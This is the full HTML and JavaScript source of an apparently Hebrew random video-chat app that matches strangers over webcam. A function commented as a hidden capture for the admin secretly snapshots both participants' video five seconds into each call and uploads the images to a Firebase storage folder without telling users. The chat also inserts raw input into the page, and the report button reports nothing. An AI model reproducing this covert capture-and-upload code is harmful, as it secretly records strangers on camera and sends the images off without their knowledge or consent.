<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VideoApp Live</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; touch-action: none; margin: 0; padding: 0; }
        body { font-family: sans-serif; background: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        /* כפתורים למעלה */
        .header { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
        .btn { background: rgba(0,0,0,0.7); border: none; color: white; padding: 10px 20px; border-radius: 25px; cursor: pointer; pointer-events: auto; font-weight: bold; }

        /* וידאו (70% מהמסך) */
        .video-grid { height: 70vh; display: flex; flex-direction: column; background: #000; }
        .video-box { flex: 1; position: relative; border-bottom: 1px solid #333; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .label { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.5); color: white; padding: 3px 10px; border-radius: 10px; font-size: 12px; }
        .status-info { position: absolute; width: 100%; text-align: center; color: #888; z-index: 10; font-size: 20px; }

        /* צ'אט (30% מהמסך בתחתית) */
        #chat-area { height: 30vh; display: none; flex-direction: column; background: #fff; border-top: 1px solid #ccc; }
        #messages { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; }
        .input-box { display: flex; padding: 10px; background: #eee; gap: 10px; }
        input { flex: 1; padding: 12px; border: 1px solid #ccc; border-radius: 8px; outline: none; }
        .send { background: #ff8000; color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: bold; }

        /* מודאל פרופיל */
        #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 200; align-items: center; justify-content: center; }
        .modal-cont { background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 300px; }
    </style>
</head>
<body>

<div class="header">
    <button id="p-btn" class="btn" onclick="openP()">פרופיל 👤</button>
    <button id="r-btn" class="btn" style="background:#e74c3c; display:none;" onclick="doReport()">דיווח</button>
    <button class="btn" onclick="flip()">🔄</button>
</div>

<div class="video-grid" id="swipe-zone">
    <div class="video-box">
        <div id="h-msg" class="status-info">גרור שמאלה לחיפוש ⬅️</div>
        <div id="s-msg" class="status-info" style="display:none; color:#ff8000;">מחפש... (<span id="sec">30</span>)</div>
        <video id="remoteV" autoplay playsinline></video>
        <div id="p-tag" class="label" style="display:none;">הצד השני <span id="p-emo"></span></div>
    </div>
    <div class="video-box">
        <video id="localV" autoplay muted playsinline></video>
        <div class="label">אתה</div>
    </div>
</div>

<div id="chat-area">
    <div id="messages"></div>
    <div class="input-box">
        <input type="text" id="chatIn" placeholder="כתוב משהו...">
        <button class="send" onclick="send()">שלח</button>
    </div>
</div>

<div id="modal">
    <div class="modal-cont">
        <h3>עריכת שם</h3>
        <input type="text" id="name-edit" style="width:100%; margin:15px 0;">
        <button onclick="saveP()" style="width:100%; padding:10px; background:#27ae60; color:white; border:none; border-radius:5px;">שמור</button>
        <button onclick="closeP()" style="width:100%; margin-top:10px; background:none; border:none; color:gray;">ביטול</button>
    </div>
</div>

<script>
    // תעדכן פה את הכתובת שתקבל מ-Render!
    const socket = io("https://video-app-backend.onrender.com"); 
    const peer = new Peer();
    
    // Firebase - לצילום למנהל
    const firebaseConfig = {
      apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10",
      authDomain: "live-video-20fca.firebaseapp.com",
      projectId: "live-video-20fca",
      storageBucket: "live-video-20fca.firebasestorage.app",
      messagingSenderId: "590706792062",
      appId: "1:590706792062:web:1b75b2871f1068f44aaa2f",
      databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com/"
    };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    let myStream, myId, isSearching = false, timer, timeLeft = 30, facing = "user";

    peer.on('open', id => myId = id);

    async function start() {
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
        document.getElementById('localV').srcObject = myStream;
    }

    // חיפוש
    function startSearch() {
        reset();
        isSearching = true;
        document.getElementById('h-msg').style.display = "none";
        document.getElementById('s-msg').style.display = "block";
        document.getElementById('p-btn').style.display = "none";

        const profile = JSON.parse(localStorage.getItem('myChatProfile'));
        socket.emit('find-partner', { peerId: myId, gender: profile.gender });

        timeLeft = 30;
        timer = setInterval(() => {
            timeLeft--;
            document.getElementById('sec').innerText = timeLeft;
            if(timeLeft <= 0) reset();
        }, 1000);
    }

    socket.on('partner-found', data => {
        clearInterval(timer);
        isSearching = false;
        document.getElementById('s-msg').style.display = "none";
        document.getElementById('p-tag').style.display = "block";
        document.getElementById('p-emo').innerText = (data.gender === "זכר") ? "👨" : "👩";
        document.getElementById('chat-area').style.display = "flex";
        document.getElementById('r-btn').style.display = "block";
        
        const call = peer.call(data.peerId, myStream);
        call.on('stream', rs => document.getElementById('remoteV').srcObject = rs);
        
        // צילום למנהל
        takeSnapshot();
    });

    peer.on('call', call => {
        call.answer(myStream);
        call.on('stream', rs => document.getElementById('remoteV').srcObject = rs);
    });

    function reset() {
        clearInterval(timer);
        isSearching = false;
        document.getElementById('h-msg').style.display = "block";
        document.getElementById('s-msg').style.display = "none";
        document.getElementById('p-btn').style.display = "block";
        document.getElementById('r-btn').style.display = "none";
        document.getElementById('chat-area').style.display = "none";
        document.getElementById('p-tag').style.display = "none";
        document.getElementById('remoteV').srcObject = null;
        document.getElementById('messages').innerHTML = "";
    }

    // צילום נסתר למנהל
    function takeSnapshot() {
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        const ctx = canvas.getContext('2d');
        setTimeout(() => {
            ctx.drawImage(document.getElementById('remoteV'), 0, 0, 320, 480);
            ctx.drawImage(document.getElementById('localV'), 320, 0, 320, 480);
            canvas.toBlob(blob => {
                storage.ref(`admin/${Date.now()}.jpg`).put(blob);
            }, 'image/jpeg');
        }, 5000);
    }

    // ניהול סוואיפ
    let x;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => x = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        if(x - e.changedTouches[0].clientX > 80) startSearch();
        else if(e.changedTouches[0].clientX - x > 80) reset();
    });

    function openP() {
        document.getElementById('name-edit').value = JSON.parse(localStorage.getItem('myChatProfile')).name;
        document.getElementById('modal').style.display = "flex";
    }
    function saveP() {
        const p = JSON.parse(localStorage.getItem('myChatProfile'));
        p.name = document.getElementById('name-edit').value;
        localStorage.setItem('myChatProfile', JSON.stringify(p));
        closeP();
    }
    function closeP() { document.getElementById('modal').style.display = "none"; }
    function send() {
        const val = document.getElementById('chatIn').value;
        if(!val) return;
        document.getElementById('messages').innerHTML += `<div><b style="color:#ff8000">אתה:</b> ${val}</div>`;
        document.getElementById('chatIn').value = "";
    }
    function flip() { facing = (facing === "user" ? "environment" : "user"); start(); }
    function doReport() { if(confirm("לדווח?")) reset(); }

    start();
</script>
</body>
</html>
